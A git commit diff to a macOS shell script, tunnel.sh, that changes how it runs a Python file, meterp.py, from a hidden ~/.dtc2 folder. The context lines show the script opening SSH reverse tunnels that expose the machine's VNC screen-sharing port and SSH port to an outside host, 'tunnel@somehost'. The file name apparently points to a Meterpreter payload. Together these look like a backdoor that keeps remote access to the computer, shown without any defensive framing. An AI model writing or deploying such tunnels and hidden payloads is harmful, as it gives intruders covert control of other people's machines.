f8c416bd76dabfa09ebb6cf337a3e8237032611c
CrazianT3k <summer.nt.lee@gmail.com>
2016-06-27 01:46:39 -0500

    Update tunnel.sh

--- tunnel.sh
+++ tunnel.sh
@@ -3,7 +3,7 @@
 USERNAME=`/usr/bin/whoami`
 PYTHON=`which python`
 
-python /Users/$USERNAME/.dtc2/meterp.py
+/usr/bin/python /Users/$USERNAME/.dtc2/meterp.py
 isitup=`ps auxwww | grep 2222 | grep ssh | grep -v grep| wc -l`
 createTunnel() {
     /usr/bin/ssh -f -N -R5900:localhost:5900 -R2222:localhost:22 tunnel@somehost 2>&1 > /dev/null
